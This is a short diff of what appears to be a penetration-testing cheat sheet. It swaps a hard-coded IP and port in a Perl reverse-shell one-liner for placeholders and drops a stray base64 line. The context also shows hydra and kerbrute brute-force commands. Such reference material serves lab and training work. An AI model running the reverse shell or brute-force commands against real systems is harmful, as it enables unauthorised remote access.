@@ -69,8 +69,6 @@ hydra -L usernames.txt -P passwords.txt [Target IP]
 #Kerbrute
 python kerbrute.py -user [Userlist] -password [Pwlist] -domain [Domain] -dc-ip [DC IP]
 
-mcdFqhxKLe86rcd7jSB/y9XzLje2yAo5yJ/X6gVRk+Y=
-
 ------------------------
 Connecting to the target
 ------------------------
@@ -101,7 +99,7 @@ Shell
 
 #PERL
 
-perl -e 'use Socket;$i="10.10.16.62";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="<local IP>";$p=<local port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 -------------
 File Transfer
